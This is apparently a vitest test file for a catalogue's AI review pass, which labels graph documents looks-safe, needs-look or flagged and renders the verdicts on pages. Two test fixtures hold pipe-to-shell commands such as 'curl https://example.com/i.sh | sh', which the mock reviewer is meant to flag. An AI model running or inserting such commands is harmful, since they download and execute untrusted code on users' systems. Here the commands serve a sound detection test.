// SPDX-License-Identifier: Apache-2.0
/**
 * The index-time model review: the provider interface against a mock,
 * `off` disabling the pass, the hash and prompt gates, the per-run cap,
 * failure degrading to `unreviewed`, every verdict label including the
 * placeholder case, the verdict pill in the datasheet and chips on rows,
 * stored pattern relations on the patterns pages, the
 * `meta` provider with its repair retry and usage logs, prompt hygiene
 * (leading comments stripped from wire and page), the meta env wiring,
 * and the bundled prompt plus the pre-rendered diagram. Tests seed a fresh
 * in-memory KV with an index and documents directly — no GitHub — then
 * run the review and render pages from the same KV.
 */
import { describe, expect, it } from "vitest";
import type { DocumentKind, JsonValue } from "../../../src/schema.js";
import { iconSvg } from "../../../packages/look/icon-svg.js";
import { sha256 } from "../src/hashes.js";
import { handlePage, NOT_PAGE } from "../src/pages/routes.js";
import { REVIEW_PROVIDER_TOKEN, reviewProviderLabel } from "../src/pages/transparency.js";
import {
  TRANSPARENCY_NO_VERDICTS,
  TRANSPARENCY_TITLE,
  PATTERN_MISSING_REF,
} from "../src/pages/copy.js";
import {
  INDEXING_MMD,
  INDEXING_MOBILE_SVG,
  INDEXING_SVG,
  REVIEW_PROMPT_V2,
  REVIEW_PROMPT_VERSION,
} from "../src/review-assets.generated.js";
import {
  REVIEWS_KEY,
  REVIEW_PATTERNS_KEY,
  REVIEW_DEFAULT_CAP,
  parseReviewPatterns,
  parseReviewsAggregate,
  parseStoredReview,
  reviewKey,
  runReview,
  type ReviewDocument,
  type ReviewProvider,
  type ReviewResult,
} from "../src/review.js";
import { buildReviewPrompt, createClaudeProvider, parseModelAnswer, stripLeadingComments } from "../src/review-claude.js";
import {
  META_DEFAULT_MAX_TOKENS,
  META_MAX_MAX_TOKENS,
  META_MIN_MAX_TOKENS,
  META_REPAIR_INSTRUCTION,
  createMetaProvider,
  resolveMetaEffort,
  resolveMetaMaxTokens,
} from "../src/review-meta.js";
import { reviewProviderFromEnv, type Env } from "../src/index.js";
import { createStore, docKey, resetIndexMemo } from "../src/store.js";
import { FakeCache, FakeKV, fakeFetch } from "./fakes.js";

const ORIGIN = "https://graphs.univerlab.org";
const NOW = Date.parse("2026-10-30T12:00:00.000Z");
const MODEL = "mock-model";
const SLUGS = ["deterministic-gates", "adversarial-review"];

/** One index entry, official only for UniverLab/canopy-graphs. */
function entry(
  kind: DocumentKind,
  owner: string,
  repo: string,
  slug: string,
  updated: string | null = null,
): Record<string, unknown> {
  return {
    kind,
    owner,
    repo,
    slug,
    name: slug,
    description: `${slug} description`,
    official: owner === "UniverLab" && repo === "canopy-graphs",
    stars: null,
    updated,
    ref: "main",
  };
}

/** One graph document running a single check command. */
function graphDoc(slug: string, command: string): Record<string, unknown> {
  return {
    format_version: 6,
    name: slug,
    description: `${slug} description`,
    nodes: [{ name: "gate", kind: "check", position: 1, config: { command } }],
    edges: [],
  };
}

/** Seed the index plus one doc key per entry. */
async function seed(
  kv: FakeKV,
  entries: Array<Record<string, unknown>>,
  documents: Record<string, Record<string, unknown>>,
): Promise<void> {
  await kv.put("index:v1", JSON.stringify({ built_at: "2026-10-30T00:00:00.000Z", entries }));
  for (const [key, document] of Object.entries(documents)) {
    await kv.put(key, JSON.stringify({ document, readme: "" }));
  }
  kv.putOptions.length = 0;
}

/** A mock provider answering per document, recording every call. */
function mockProvider(
  answer: (document: ReviewDocument) => ReviewResult,
  model: string = MODEL,
): ReviewProvider & { calls: string[] } {
  const calls: string[] = [];
  return {
    model,
    calls,
    review(document: ReviewDocument): Promise<ReviewResult> {
      calls.push(`${document.owner}/${document.repo}/${document.slug}`);
      return Promise.resolve(answer(document));
    },
  };
}

/** Render one page from this KV; no request may reach upstream. */
async function call(path: string, kv: FakeKV, accept?: string, reviewProvider?: string): Promise<Response> {
  resetIndexMemo();
  const fake = fakeFetch([]);
  const headers = new Headers();
  if (accept !== undefined) {
    headers.set("accept", accept);
  }
  const answer = await handlePage(new Request(`${ORIGIN}${path}`, { headers }), { INDEX: kv, REVIEW_PROVIDER: reviewProvider }, {
    fetchImpl: fake.fetchImpl,
    cache: new FakeCache(),
  });
  expect(answer).not.toBe(NOT_PAGE);
  expect(fake.calls, "no page may reach upstream").toEqual([]);
  return answer as unknown as Response;
}

describe("the provider interface", () => {
  it("reviews through a mock and stores verdict, patterns, hash, prompt, model and date", async () => {
    const kv = new FakeKV();
    const entries = [entry("graph", "acme", "things", "flow", "2026-10-29")];
    const document = graphDoc("flow", "echo hi");
    await seed(kv, entries, { [docKey("graph", "acme", "things", "flow")]: document });
    const provider = mockProvider(() => ({
      verdict: "looks-safe",
      reasons: "",
      patterns: ["deterministic-gates", "no-such-pattern"],
    }));
    const stats = await runReview({
      index: kv,
      provider,
      patternSlugs: SLUGS,
      now: () => NOW,
    });
    expect(stats).toEqual({ candidates: 1, reviewed: 1, failed: 0, pruned: 0 });
    expect(provider.calls).toEqual(["acme/things/flow"]);
    const raw = await kv.get(docKey("graph", "acme", "things", "flow"));
    const hash = await sha256(raw as string);
    const stored = parseStoredReview((await kv.get(reviewKey("graph", "acme", "things", "flow"))) as string);
    // Unknown slugs are dropped; the scanned hash, prompt, model and date are kept.
    expect(stored).toEqual({
      verdict: "looks-safe",
      reasons: "",
      patterns: ["deterministic-gates"],
      hash,
      prompt: "v2",
      model: MODEL,
      reviewed_at: "2026-10-30T12:00:00.000Z",
    });
    const aggregate = parseReviewsAggregate((await kv.get(REVIEWS_KEY)) as string);
    expect(aggregate?.reviews).toEqual([{
      kind: "graph",
      owner: "acme",
      repo: "things",
      slug: "flow",
      verdict: "looks-safe",
      reasons: "",
      patterns: ["deterministic-gates"],
      hash,
      prompt: "v2",
      model: MODEL,
      reviewed_at: "2026-10-30T12:00:00.000Z",
    }]);
    const patterns = parseReviewPatterns((await kv.get(REVIEW_PATTERNS_KEY)) as string);
    expect(patterns?.relations["deterministic-gates"]).toEqual([
      { kind: "graph", owner: "acme", repo: "things", slug: "flow" },
    ]);
    expect(patterns?.relations["adversarial-review"]).toEqual([]);
  });

  it("stores no patterns for nodes, whatever the model named", async () => {
    const kv = new FakeKV();
    const entries = [entry("node", "acme", "things", "cool-node", "2026-10-29")];
    const document = { format_version: 1, name: "cool-node", kind: "agent", config: {}, description: "d" };
    await seed(kv, entries, { [docKey("node", "acme", "things", "cool-node")]: document });
    const provider = mockProvider(() => ({
      verdict: "flagged",
      reasons: "suspicious",
      patterns: ["deterministic-gates"],
    }));
    await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW });
    const stored = parseStoredReview((await kv.get(reviewKey("node", "acme", "things", "cool-node"))) as string);
    expect(stored?.verdict).toBe("flagged");
    expect(stored?.patterns).toEqual([]);
    const patterns = parseReviewPatterns((await kv.get(REVIEW_PATTERNS_KEY)) as string);
    expect(patterns?.relations["deterministic-gates"]).toEqual([]);
  });
});

describe("off mode", () => {
  it("touches no KV key and leaves indexing unaffected", async () => {
    const kv = new FakeKV();
    const entries = [entry("graph", "acme", "things", "flow", "2026-10-29")];
    await seed(kv, entries, { [docKey("graph", "acme", "things", "flow")]: graphDoc("flow", "echo hi") });
    const before = kv.storedKeys();
    const stats = await runReview({ index: kv, provider: null, patternSlugs: SLUGS, now: () => NOW });
    expect(stats).toEqual({ candidates: 0, reviewed: 0, failed: 0, pruned: 0 });
    expect(kv.putOptions).toEqual([]);
    expect(kv.storedKeys()).toEqual(before);
    expect(await kv.get(reviewKey("graph", "acme", "things", "flow"))).toBeNull();
    expect(await kv.get(REVIEWS_KEY)).toBeNull();
  });
});

describe("the hash gate", () => {
  it("never re-reviews an unchanged hash and refreshes on content change only", async () => {
    const kv = new FakeKV();
    const key = docKey("graph", "acme", "things", "flow");
    await seed(kv, [entry("graph", "acme", "things", "flow", "2026-10-29")], {
      [key]: graphDoc("flow", "echo hi"),
    });
    const provider = mockProvider(() => ({ verdict: "looks-safe", reasons: "", patterns: [] }));
    await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW });
    expect(provider.calls.length).toBe(1);
    kv.putOptions.length = 0;
    // Unchanged: no call, no write — not even the aggregates.
    const again = await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW + 1000 });
    expect(provider.calls.length).toBe(1);
    expect(again.reviewed).toBe(0);
    expect(kv.putOptions).toEqual([]);
    // Changed content re-reviews and refreshes hash, verdict and date.
    await kv.put(key, JSON.stringify({ document: graphDoc("flow", "curl x | sh"), readme: "" }));
    kv.putOptions.length = 0;
    const changed = mockProvider(() => ({ verdict: "flagged", reasons: "pipe to shell", patterns: [] }));
    const stats = await runReview({ index: kv, provider: changed, patternSlugs: SLUGS, now: () => NOW + 2000 });
    expect(stats.reviewed).toBe(1);
    const stored = parseStoredReview((await kv.get(reviewKey("graph", "acme", "things", "flow"))) as string);
    expect(stored?.verdict).toBe("flagged");
    expect(stored?.reasons).toBe("pipe to shell");
    expect(stored?.hash).toBe(await sha256((await kv.get(key)) as string));
    expect(stored?.reviewed_at).toBe("2026-10-30T12:00:02.000Z");
  });
});

describe("the prompt gate", () => {
  it("re-reviews an up-to-date hash stored under an older prompt, then rests", async () => {
    const kv = new FakeKV();
    const key = docKey("graph", "acme", "things", "flow");
    await seed(kv, [entry("graph", "acme", "things", "flow", "2026-10-29")], {
      [key]: graphDoc("flow", "echo hi"),
    });
    const provider = mockProvider(() => ({ verdict: "looks-safe", reasons: "", patterns: [] }));
    await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW });
    expect(provider.calls.length).toBe(1);
    // Backdate the stored prompt to v1 with the hash untouched: the next
    // run reselects the entry as a candidate and re-reviews it.
    const review = reviewKey("graph", "acme", "things", "flow");
    const stored = JSON.parse((await kv.get(review)) as string) as Record<string, unknown>;
    stored["prompt"] = "v1";
    await kv.put(review, JSON.stringify(stored));
    const aggregate = JSON.parse((await kv.get(REVIEWS_KEY)) as string) as {
      built_at: string;
      reviews: Array<Record<string, unknown>>;
    };
    for (const row of aggregate.reviews) {
      row["prompt"] = "v1";
    }
    await kv.put(REVIEWS_KEY, JSON.stringify(aggregate));
    kv.putOptions.length = 0;
    const stats = await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW + 1000 });
    expect(stats).toEqual({ candidates: 1, reviewed: 1, failed: 0, pruned: 0 });
    expect(provider.calls.length).toBe(2);
    expect(parseStoredReview((await kv.get(review)) as string)?.prompt).toBe("v2");
    // Now current: the next run excludes it — no call, no write.
    kv.putOptions.length = 0;
    const again = await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW + 2000 });
    expect(again.reviewed).toBe(0);
    expect(provider.calls.length).toBe(2);
    expect(kv.putOptions).toEqual([]);
  });

  it("reads rows without a prompt as v1, and any version verbatim", () => {
    const row = {
      verdict: "looks-safe",
      reasons: "",
      patterns: [],
      hash: "abc",
      model: MODEL,
      reviewed_at: "2026-10-30T12:00:00.000Z",
    };
    expect(parseStoredReview(JSON.stringify(row))?.prompt).toBe("v1");
    const aggregate = parseReviewsAggregate(JSON.stringify({
      built_at: "2026-10-30T12:00:00.000Z",
      reviews: [{ kind: "graph", owner: "acme", repo: "things", slug: "flow", ...row }],
    }));
    expect(aggregate?.reviews[0]?.prompt).toBe("v1");
    // An invalid prompt reads as v1 too; a future version parses verbatim.
    for (const prompt of ["", 42, null]) {
      expect(parseStoredReview(JSON.stringify({ ...row, prompt }))?.prompt).toBe("v1");
    }
    expect(parseStoredReview(JSON.stringify({ ...row, prompt: "v9" }))?.prompt).toBe("v9");
  });
});

describe("the scan cap", () => {
  it("takes the newest unscanned documents first", async () => {
    const kv = new FakeKV();
    const entries = [
      entry("graph", "acme", "things", "old", "2026-10-25"),
      entry("graph", "acme", "things", "new", "2026-10-29"),
      entry("graph", "acme", "things", "nodate", null),
    ];
    await seed(kv, entries, {
      [docKey("graph", "acme", "things", "old")]: graphDoc("old", "echo old"),
      [docKey("graph", "acme", "things", "new")]: graphDoc("new", "echo new"),
      [docKey("graph", "acme", "things", "nodate")]: graphDoc("nodate", "echo nodate"),
    });
    const provider = mockProvider(() => ({ verdict: "looks-safe", reasons: "", patterns: [] }));
    const stats = await runReview({ index: kv, provider, patternSlugs: SLUGS, cap: 2, now: () => NOW });
    expect(stats).toEqual({ candidates: 3, reviewed: 2, failed: 0, pruned: 0 });
    expect(provider.calls).toEqual(["acme/things/new", "acme/things/old"]);
    expect(await kv.get(reviewKey("graph", "acme", "things", "new"))).not.toBeNull();
    expect(await kv.get(reviewKey("graph", "acme", "things", "old"))).not.toBeNull();
    expect(await kv.get(reviewKey("graph", "acme", "things", "nodate"))).toBeNull();
    // The next run picks up the remainder.
    await runReview({ index: kv, provider, patternSlugs: SLUGS, cap: 5, now: () => NOW });
    expect(provider.calls).toEqual(["acme/things/new", "acme/things/old", "acme/things/nodate"]);
  });

  it("defaults to five when no cap is configured", async () => {
    expect(REVIEW_DEFAULT_CAP).toBe(5);
  });
});

describe("failure", () => {
  it("leaves failed documents unreviewed without touching the index path", async () => {
    const kv = new FakeKV();
    const entries = [
      entry("graph", "acme", "things", "good", "2026-10-29"),
      entry("graph", "acme", "things", "bad", "2026-10-28"),
    ];
    await seed(kv, entries, {
      [docKey("graph", "acme", "things", "good")]: graphDoc("good", "echo hi"),
      [docKey("graph", "acme", "things", "bad")]: graphDoc("bad", "echo hi"),
    });
    const indexBefore = await kv.get("index:v1");
    const provider: ReviewProvider = {
      model: MODEL,
      review(document: ReviewDocument): Promise<ReviewResult> {
        return document.slug === "bad"
          ? Promise.reject(new Error("credits exhausted"))
          : Promise.resolve({ verdict: "looks-safe", reasons: "", patterns: [] });
      },
    };
    const stats = await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW });
    expect(stats.reviewed).toBe(1);
    expect(stats.failed).toBe(1);
    expect(await kv.get(reviewKey("graph", "acme", "things", "bad"))).toBeNull();
    expect(await kv.get(reviewKey("graph", "acme", "things", "good"))).not.toBeNull();
    // The index path is untouched: same index, same documents.
    expect(await kv.get("index:v1")).toBe(indexBefore);
    expect(await kv.get(docKey("graph", "acme", "things", "bad"))).not.toBeNull();
    const html = await (await call("/g/acme/things/bad", kv)).text();
    expect(html).not.toContain("Verdict of");
  });

  it("leaves off-shape answers unreviewed", async () => {
    const kv = new FakeKV();
    await seed(kv, [entry("graph", "acme", "things", "flow", "2026-10-29")], {
      [docKey("graph", "acme", "things", "flow")]: graphDoc("flow", "echo hi"),
    });
    const provider = mockProvider(() => ({ verdict: "bogus", reasons: "", patterns: [] }) as unknown as ReviewResult);
    const stats = await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW });
    expect(stats).toEqual({ candidates: 1, reviewed: 0, failed: 1, pruned: 0 });
    expect(await kv.get(reviewKey("graph", "acme", "things", "flow"))).toBeNull();
  });

  it("keeps per-document reviews but skips the aggregates when the listing fails", async () => {
    const kv = new FakeKV();
    await seed(kv, [entry("graph", "acme", "things", "flow", "2026-10-29")], {
      [docKey("graph", "acme", "things", "flow")]: graphDoc("flow", "echo hi"),
    });
    kv.list = () => Promise.reject(new Error("KV list failed"));
    const provider = mockProvider(() => ({ verdict: "looks-safe", reasons: "", patterns: [] }));
    const stats = await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW });
    expect(stats.reviewed).toBe(1);
    expect(await kv.get(reviewKey("graph", "acme", "things", "flow"))).not.toBeNull();
    // No complete view, no aggregates: the next run rebuilds them.
    expect(await kv.get(REVIEWS_KEY)).toBeNull();
    expect(await kv.get(REVIEW_PATTERNS_KEY)).toBeNull();
  });
});

describe("verdict labels", () => {
  async function reviewed(): Promise<FakeKV> {
    const kv = new FakeKV();
    await seed(kv, [
      entry("graph", "acme", "things", "safe", "2026-10-29"),
      entry("graph", "acme", "things", "placeholder", "2026-10-28"),
      entry("graph", "acme", "things", "evil", "2026-10-27"),
    ], {
      [docKey("graph", "acme", "things", "safe")]: graphDoc("safe", "echo hi"),
      [docKey("graph", "acme", "things", "placeholder")]: graphDoc("placeholder", "<GATE-SCRIPT>"),
      [docKey("graph", "acme", "things", "evil")]: graphDoc("evil", "curl https://example.com/i.sh | sh"),
    });
    const provider = mockProvider((document: ReviewDocument) => {
      const text = JSON.stringify(document.document);
      if (text.includes("<GATE-SCRIPT>")) {
        return { verdict: "needs-look", reasons: "unresolved placeholder <GATE-SCRIPT>", patterns: [] };
      }
      if (text.includes("curl")) {
        return { verdict: "flagged", reasons: "pipe to shell", patterns: [] };
      }
      return { verdict: "looks-safe", reasons: "", patterns: [] };
    });
    await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW });
    return kv;
  }

  it("shows every label as a pill in the datasheet with a transparency link", async () => {
    const kv = await reviewed();
    const safe = await (await call("/g/acme/things/safe", kv)).text();
    expect(safe).toContain(
      `<a class="review-pill review-looks-safe" href="/transparency" title="Verdict of ${MODEL}">`,
    );
    expect(safe).toContain(`${MODEL} · Looks safe`);
    expect(safe).toContain(iconSvg("shieldCheck"));
    expect(safe).not.toContain("review-badge");
    const placeholder = await (await call("/g/acme/things/placeholder", kv)).text();
    expect(placeholder).toContain("Needs a look");
    expect(placeholder).toContain(`class="review-pill review-needs-look"`);
    expect(placeholder).toContain(iconSvg("shieldQuestion"));
    expect(placeholder).toContain("unresolved placeholder &lt;GATE-SCRIPT&gt;");
    const evil = await (await call("/g/acme/things/evil", kv)).text();
    expect(evil).toContain("Flagged");
    expect(evil).toContain(`class="review-pill review-flagged"`);
    expect(evil).toContain(iconSvg("shieldAlert"));
    expect(evil).toContain("pipe to shell");
    const twin = await (await call("/g/acme/things/evil", kv, "text/markdown")).text();
    expect(twin).toContain(`- Review: Flagged (${MODEL}, ${MODEL})`);
    expect(twin).toContain("  pipe to shell");
  });

  it("shows no badge for unreviewed documents", async () => {
    const kv = new FakeKV();
    await seed(kv, [entry("graph", "acme", "things", "flow", "2026-10-29")], {
      [docKey("graph", "acme", "things", "flow")]: graphDoc("flow", "echo hi"),
    });
    const html = await (await call("/g/acme/things/flow", kv)).text();
    expect(html).not.toContain("Verdict of");
    expect(html).not.toContain('class="review-pill');
    expect(html).not.toContain('class="review-chip');
    expect(html).not.toContain("<dt>Review</dt>");
    const twin = await (await call("/g/acme/things/flow", kv, "text/markdown")).text();
    expect(twin).not.toContain("Verdict of");
    expect(twin).not.toContain("- Review:");
  });
});

describe("the verdict pill and row chips", () => {
  const PILL_MODEL = "muse-spark-1.3-contributor";
  const NODE_DOC = { format_version: 1, name: "cool-node", kind: "agent", config: {}, description: "d" };

  /** One stored review body; the model shortens to "Muse". */
  function pillReview(verdict = "looks-safe", reasons = "", model: string = PILL_MODEL): Record<string, unknown> {
    return {
      verdict,
      reasons,
      patterns: [],
      hash: "abc123",
      prompt: "v2",
      model,
      reviewed_at: "2026-10-30T12:00:00.000Z",
    };
  }

  interface PillRow {
    kind?: DocumentKind;
    slug: string;
    verdict?: string;
    reasons?: string;
    model?: string;
    hint?: string[];
    reviewed?: boolean;
  }

  /** Seed the index, documents, per-key reviews and the `reviews:v1` aggregate. */
  async function seedRows(kv: FakeKV, rows: PillRow[]): Promise<void> {
    await seed(
      kv,
      rows.map((row, index) => ({
        ...entry(row.kind ?? "graph", "acme", "things", row.slug, `2026-10-${String(29 - index).padStart(2, "0")}`),
        ...(row.hint === undefined ? {} : { harness_hint: row.hint }),
      })),
      Object.fromEntries(rows.map((row) => {
        const kind = row.kind ?? "graph";
        const document = kind === "node" ? NODE_DOC : graphDoc(row.slug, "echo hi");
        return [docKey(kind, "acme", "things", row.slug), document];
      })),
    );
    const reviewed = rows.filter((row) => row.reviewed !== false);
    for (const row of reviewed) {
      const body = pillReview(row.verdict, row.reasons, row.model);
      await kv.put(reviewKey(row.kind ?? "graph", "acme", "things", row.slug), JSON.stringify(body));
    }
    await kv.put(REVIEWS_KEY, JSON.stringify({
      built_at: "2026-10-30T00:00:00.000Z",
      reviews: reviewed.map((row) => ({
        kind: row.kind ?? "graph",
        owner: "acme",
        repo: "things",
        slug: row.slug,
        ...pillReview(row.verdict, row.reasons, row.model),
      })),
    }));
  }

  /** Two graphs, one reviewed; the reviewed one runs on a known harness. */
  async function seedPair(kv: FakeKV): Promise<void> {
    await seedRows(kv, [
      { slug: "flow", verdict: "needs-look", reasons: "unresolved placeholder <X>", hint: ["Muse"] },
      { slug: "draft", reviewed: false },
    ]);
  }

  it("renders the pill with the right icon, label, title and class per verdict", async () => {
    const kv = new FakeKV();
    await seedRows(kv, [
      { slug: "safe" },
      { slug: "wary", verdict: "needs-look", reasons: "unresolved placeholder <X>" },
      { slug: "evil", verdict: "flagged", reasons: "pipe to shell" },
      { kind: "node", slug: "cool-node" },
    ]);
    const cases = [
      { path: "/g/acme/things/safe", verdict: "looks-safe", label: "Looks safe", icon: "shieldCheck" },
      { path: "/g/acme/things/wary", verdict: "needs-look", label: "Needs a look", icon: "shieldQuestion" },
      { path: "/g/acme/things/evil", verdict: "flagged", label: "Flagged", icon: "shieldAlert" },
      { path: "/n/acme/things/cool-node", verdict: "looks-safe", label: "Looks safe", icon: "shieldCheck" },
    ] as const;
    for (const { path, verdict, label, icon } of cases) {
      const html = await (await call(path, kv)).text();
      expect(html, path).toContain(
        `<a class="review-pill review-${verdict}" href="/transparency" title="Verdict of ${PILL_MODEL}">`,
      );
      expect(html, path).toContain(`Muse · ${label}`);
      expect(html, path).toContain(iconSvg(icon));
      // The Review field sits right after Name in the datasheet.
      const name = html.indexOf("<dt>Name</dt>");
      const review = html.indexOf("<dt>Review</dt>");
      const source = html.indexOf("<dt>Source</dt>");
      expect(name, path).toBeGreaterThan(-1);
      expect(review, path).toBeGreaterThan(name);
      expect(source, path).toBeGreaterThan(review);
      expect(html, path).not.toContain("review-badge");
    }
  });

  it("falls back to the full model id for an unknown reviewer", async () => {
    const kv = new FakeKV();
    await seedRows(kv, [{ slug: "flow", model: "homebrew-9000" }]);
    const html = await (await call("/g/acme/things/flow", kv)).text();
    expect(html).toContain("homebrew-9000 · Looks safe");
    expect(html).toContain(`title="Verdict of homebrew-9000"`);
  });

  it("shows reasons under the pill for needs-look and flagged only", async () => {
    const kv = new FakeKV();
    await seedRows(kv, [
      { slug: "safe" },
      { slug: "wary", verdict: "needs-look", reasons: "unresolved placeholder <X>" },
      { slug: "evil", verdict: "flagged", reasons: "pipe to shell" },
      { slug: "quiet", verdict: "needs-look" },
    ]);
    // A safe verdict never shows reasons, even in the same field.
    const safe = await (await call("/g/acme/things/safe", kv)).text();
    expect(safe).toContain(`class="review-pill review-looks-safe"`);
    expect(safe).not.toContain('class="review-reasons"');
    const wary = await (await call("/g/acme/things/wary", kv)).text();
    expect(wary).toContain(`<p class="review-reasons">unresolved placeholder &lt;X&gt;</p>`);
    const evil = await (await call("/g/acme/things/evil", kv)).text();
    expect(evil).toContain(`<p class="review-reasons">pipe to shell</p>`);
    // Empty reasons render no paragraph, whatever the verdict.
    const quiet = await (await call("/g/acme/things/quiet", kv)).text();
    expect(quiet).toContain(`class="review-pill review-needs-look"`);
    expect(quiet).not.toContain('class="review-reasons"');
    // The twin carries the verdict line after Name, with a continuation for reasons.
    const twin = await (await call("/g/acme/things/wary", kv, "text/markdown")).text();
    const name = twin.indexOf("- Name: wary");
    const review = twin.indexOf(`- Review: Needs a look (Muse, ${PILL_MODEL})`);
    const reasons = twin.indexOf("  unresolved placeholder <X>");
    expect(name).toBeGreaterThan(-1);
    expect(review).toBeGreaterThan(name);
    expect(reasons).toBeGreaterThan(review);
    const safeTwin = await (await call("/g/acme/things/safe", kv, "text/markdown")).text();
    expect(safeTwin).toContain(`- Review: Looks safe (Muse, ${PILL_MODEL})`);
    const safeLines = safeTwin.split("\n");
    const safeReviewAt = safeLines.findIndex((line) => line.startsWith("- Review:"));
    expect(safeReviewAt).toBeGreaterThan(-1);
    expect(safeLines[safeReviewAt + 1]?.startsWith("  ") ?? false).toBe(false);
  });

  it("shows one chip per reviewed row on home and search, beside the harness dots", async () => {
    const kv = new FakeKV();
    await seedPair(kv);
    const home = await (await call("/", kv)).text();
    expect(home.match(/class="review-chip review-/g) ?? []).toHaveLength(1);
    expect(home).toContain(
      `<a class="review-chip review-needs-look" href="/transparency" title="Verdict of ${PILL_MODEL}">`,
    );
    expect(home).toContain("<span>Needs a look</span>");
    expect(home).not.toContain("Muse ·");
    // The chip rides right after the row's harness dots.
    expect(home.indexOf('class="dots"')).toBeGreaterThan(-1);
    expect(home.indexOf('class="dots"')).toBeLessThan(home.indexOf('class="review-chip'));
    const search = await (await call("/search?q=flow", kv)).text();
    expect(search.match(/class="review-chip review-/g) ?? []).toHaveLength(1);
    expect(search).toContain("<span>Needs a look</span>");
    // The unreviewed row shows no chip anywhere.
    const unreviewed = await (await call("/search?q=draft", kv)).text();
    expect(unreviewed).not.toContain('class="review-chip');
  });

  it("shows chips on pattern rows from the same aggregate", async () => {
    const kv = new FakeKV();
    await seedRows(kv, [{ slug: "flow", verdict: "flagged", reasons: "pipe to shell" }]);
    await kv.put(REVIEW_PATTERNS_KEY, JSON.stringify({
      built_at: "2026-10-30T00:00:00.000Z",
      relations: { "deterministic-gates": [{ kind: "graph", owner: "acme", repo: "things", slug: "flow" }] },
    }));
    const html = await (await call("/patterns/deterministic-gates", kv)).text();
    expect(html).toContain(`<a class="row-name" href="/g/acme/things/flow">flow</a>`);
    expect(html).toContain(`class="review-chip review-flagged"`);
    const twin = await (await call("/patterns/deterministic-gates", kv, "text/markdown")).text();
    expect(twin).toContain(`[flow](/g/acme/things/flow)`);
    expect(twin).toContain(" · Verdict: Flagged");
  });

  it("reads the reviews aggregate once per list request, never for a document", async () => {
    const kv = new FakeKV();
    let aggregateReads = 0;
    const rawGet = kv.get.bind(kv);
    kv.get = (key: string): Promise<string | null> => {
      if (key === REVIEWS_KEY) {
        aggregateReads += 1;
      }
      return rawGet(key);
    };
    await seedPair(kv);
    for (const path of ["/", "/search?q=flow", "/patterns/deterministic-gates"]) {
      aggregateReads = 0;
      const response = await call(path, kv);
      expect(response.status, path).toBe(200);
      expect(aggregateReads, path).toBe(1);
    }
    aggregateReads = 0;
    await call("/g/acme/things/flow", kv);
    expect(aggregateReads).toBe(0);
  });

  it("appends the verdict to reviewed rows in list twins only", async () => {
    const kv = new FakeKV();
    await seedPair(kv);
    const twin = await (await call("/", kv, "text/markdown")).text();
    const flowLine = twin.split("\n").find((line) => line.includes("[flow]"));
    expect(flowLine).toMatch(/ · Verdict: Needs a look$/);
    const draftLine = twin.split("\n").find((line) => line.includes("[draft]"));
    expect(draftLine).not.toContain("Verdict:");
  });
});

describe("stored pattern relations", () => {
  it("links graphs from stored relations, replacing the static graph links", async () => {
    const kv = new FakeKV();
    await seed(kv, [entry("graph", "acme", "things", "flow", "2026-10-29")], {
      [docKey("graph", "acme", "things", "flow")]: graphDoc("flow", "echo hi"),
    });
    const provider = mockProvider(() => ({
      verdict: "looks-safe",
      reasons: "",
      patterns: ["deterministic-gates"],
    }));
    await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW });
    const html = await (await call("/patterns/deterministic-gates", kv)).text();
    // The reviewed community graph renders as a catalogue row with its plate.
    expect(html).toContain(`<a class="row-name" href="/g/acme/things/flow">flow</a>`);
    expect(html).toContain(`<code>canopy graph install acme/things/flow</code>`);
    // The statically authored graph links are replaced: no static graph row.
    expect(html).not.toContain(`<a class="row-name" href="/g/canopy-builder">`);
    expect(html).not.toContain(`<a class="row-name" href="/g/adversarial-developer">`);
    expect(html).not.toContain(`<span class="row-name">graph:canopy-builder</span>`);
    // The static node refs stay: reviews carry none for nodes.
    expect(html).toContain(`<span class="row-name">node:full-gates-cargo</span>`);
    expect(html).toContain(PATTERN_MISSING_REF);
    // The document links back to its stored patterns.
    const doc = await (await call("/g/acme/things/flow", kv)).text();
    expect(doc).toContain(`<a href="/patterns/deterministic-gates">`);
    const twin = await (await call("/patterns/deterministic-gates", kv, "text/markdown")).text();
    expect(twin).toContain(`[flow](/g/acme/things/flow)`);
  });

  it("keeps the static links before the first review landed", async () => {
    const kv = new FakeKV();
    await seed(kv, [entry("graph", "acme", "things", "flow", "2026-10-29")], {
      [docKey("graph", "acme", "things", "flow")]: graphDoc("flow", "echo hi"),
    });
    const html = await (await call("/patterns/deterministic-gates", kv)).text();
    expect(html).toContain(`<span class="row-name">graph:canopy-builder</span>`);
  });

  it("keeps the static graph links for a pattern the last review never saw", async () => {
    const kv = new FakeKV();
    await seed(kv, [entry("graph", "acme", "things", "flow", "2026-10-29")], {
      [docKey("graph", "acme", "things", "flow")]: graphDoc("flow", "echo hi"),
    });
    // Reviewed when the bundled list held another slug only: the relations
    // aggregate exists but carries no key for deterministic-gates.
    const provider = mockProvider(() => ({
      verdict: "looks-safe",
      reasons: "",
      patterns: ["other-pattern"],
    }));
    await runReview({ index: kv, provider, patternSlugs: ["other-pattern"], now: () => NOW });
    const html = await (await call("/patterns/deterministic-gates", kv)).text();
    expect(html).toContain(`<span class="row-name">graph:canopy-builder</span>`);
  });
});

describe("the transparency page", () => {
  it("explains the index, shows the prompt and the diagram, and lists verdicts", async () => {
    const kv = new FakeKV();
    await seed(kv, [entry("graph", "acme", "things", "flow", "2026-10-29")], {
      [docKey("graph", "acme", "things", "flow")]: graphDoc("flow", "echo hi"),
    });
    const provider = mockProvider(() => ({ verdict: "looks-safe", reasons: "", patterns: [] }));
    await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW });
    const response = await call("/transparency", kv);
    expect(response.status).toBe(200);
    const html = await response.text();
    expect(html).toContain(TRANSPARENCY_TITLE);
    expect(html).toContain("every 15 minutes");
    expect(html).toContain("canopy-graph");
    expect(html).toContain("never blocks them");
    expect(html).toContain("<svg");
    expect(html).toContain(">Cron</text>");
    expect(html).toContain("review newest unscanned docs");
    // The stripped v2 prompt, exactly as the model saw it.
    expect(html).toContain("&lt;review_prompt");
